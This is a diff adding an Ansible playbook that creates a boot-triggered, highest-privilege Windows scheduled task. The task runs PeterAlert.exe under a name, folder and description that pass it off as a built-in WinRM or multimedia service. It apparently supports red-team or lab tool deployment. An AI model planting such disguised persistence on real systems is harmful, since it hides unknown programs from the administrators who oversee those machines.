@@ -1,0 +1,13 @@
+---
+- name: Create a new scheduled task for tool deployment
+  community.windows.win_scheduled_task:
+    name: WinRMSystemSoundsService
+    path: \Microsoft\Windows\Multimedia\
+    description: "WinRM System Sounds User Mode Agent"
+    actions:
+    - path: C:\Windows\System32\PeterAlert.exe
+    triggers:
+    - type: boot
+    group: BUILTIN\Administrators
+    run_level: highest
+    state: present
